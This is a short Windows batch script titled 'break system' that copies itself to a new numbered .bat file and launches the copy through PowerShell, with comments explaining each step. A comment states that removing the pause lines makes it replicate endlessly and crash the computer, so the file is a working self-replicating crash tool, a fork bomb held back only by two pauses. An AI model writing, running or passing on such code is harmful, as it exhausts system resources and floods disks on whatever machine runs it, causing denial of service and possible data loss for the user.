@echo off
title break system

::if pauses are removed it would replicate and crash the computer
pause

::sets a number to an given input when process starts
set startNum=%1
::then it looks to see if the input given was a valid number
echo %startNum%|findstr /r /c:"[0-9][0-9]*$" >nul
if errorlevel 1 (set startNum=0)
:: if it was not a valid number then it sets startNum to 0

::it then makes startNum one bigger
set /A startNum= %startNum%+1

::it then grabs the current directory path
for /f "delims=" %%a in ('cd') do @set currDir=%%a

::it then copies itself with the startNum on the end to make a new file of the same code
copy %currDir%\self_replicating.bat %currDir%\self_replicating%startNum%.bat

::where it then proceedes to call for the new file to run with the number as an additional input
powershell.exe -Command "Start-Process '%~f0' %startNum%"

pause
